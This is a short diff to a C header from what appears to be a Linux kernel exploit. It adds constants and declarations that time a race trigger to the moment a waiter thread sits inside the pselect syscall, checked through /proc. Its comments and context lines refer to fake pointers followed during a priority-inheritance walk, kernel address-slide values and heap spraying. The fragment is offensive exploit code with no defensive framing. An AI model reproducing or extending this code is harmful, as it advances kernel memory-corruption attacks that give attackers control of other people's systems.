@@ -95,6 +95,16 @@ extern int g_core_consumer;
 #ifndef ROUTE_WAIT_SECONDS
 #define ROUTE_WAIT_SECONDS 1
 #endif
+
+/* The consumer only perturbs the waiter while the pselect syscall is live:
+ * too early and the fd_set has not been copied to the stack yet, too late and
+ * the slot is reused. Either way the PI walk follows fake pointers that are no
+ * longer valid. The waiter's /proc entry is the direct evidence it is parked
+ * inside the syscall, so it is checked before the trigger fires. */
+#define PSELECT_GUARD_CONFIRMATIONS 3
+#define PSELECT_GUARD_WINDOW_USEC 20000
+#define PSELECT_GUARD_MAX_AGE_USEC 150000
+#define PSELECT_GUARD_POLL_USEC 100
 #define SLIDE_NFULNL_LOGGER \
   data_addr(SLIDE_NFULNL_LOGGER_IMAGE)
 #define SLIDE_LOGGERS_0_1 data_addr(SLIDE_LOGGERS_0_1_IMAGE)
@@ -151,6 +161,8 @@ extern atomic_int consumer_calls;
 extern atomic_int consumer_success;
 extern atomic_int consumer_inflight;
 extern atomic_int main_route_delay_usec;
+extern atomic_llong pselect_started_ns;
+uint64_t route_now_ns(void);
 extern int route_last_step;
 extern int route_last_errno;
 /* consumer drained and fds released; a dirty run must not be sprayed onto */
